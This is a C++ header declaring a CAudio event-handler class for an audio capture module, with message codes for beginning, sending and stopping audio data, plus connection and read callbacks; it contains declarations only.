#pragma once
#include "EventHandler.h"
#include "AudioGrab.h"
#define AUDIO		('A'|'U'<<8|'D'<<16|'O'<<24)


#define AUDIO_ERROR (0x0000)

#define AUDIO_BEGIN (0xaaa0)
#define AUDIO_DATA	(0xaaa1)
#define AUDIO_STOP  (0xaaa2)


class CAudio :
	public CEventHandler
{
	CAudioGrab m_AudioGrab;

	HANDLE	   m_hWorkThread;
	volatile unsigned int m_IsWorking;

	void OnAudioBegin();
	void OnAudioStop();

	//void OnAudioData();
	static void WorkThread(CAudio*pThis);
public:
	CAudio(DWORD dwIdentity);

	void OnConnect();
	void OnClose();

	void OnReadComplete(WORD Event, DWORD Total, DWORD dwRead, char*Buffer);
	~CAudio();
};

